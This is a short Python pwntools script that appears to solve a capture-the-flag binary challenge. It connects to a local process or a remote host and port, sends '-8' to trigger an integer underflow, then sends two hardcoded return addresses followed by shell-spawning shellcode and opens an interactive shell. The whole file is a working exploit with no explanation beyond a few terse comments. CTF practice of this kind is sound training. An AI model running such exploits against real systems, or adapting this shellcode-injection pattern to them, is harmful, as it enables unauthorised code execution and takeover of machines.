#!/usr/bin/env python
from pwn import *
context(os='linux',arch='i386')

# If a HOST is given on the cmdline, then assume that it is already running there
if 'HOST' in pwn.args:
    HOST = pwn.args['HOST']
    PORT = int(pwn.args.get('PORT', 7777))
    r = remote(HOST, PORT)
else:
    # Otherwise start the binary locally
    r = process('./8ff953dd97c4405234a04291dee39e0b')

r.clean(1)

# Underflow
r.sendline('-8')
r.clean(1)

# Win
buf = ''
buf += p32(0x80491E8)
buf += p32(0x80491E0)
buf += asm(shellcraft.sh())

log.info("Sending payload:\n%s" % hexdump(buf))

r.sendline(buf)
r.clean(1)

# Shell
r.interactive()
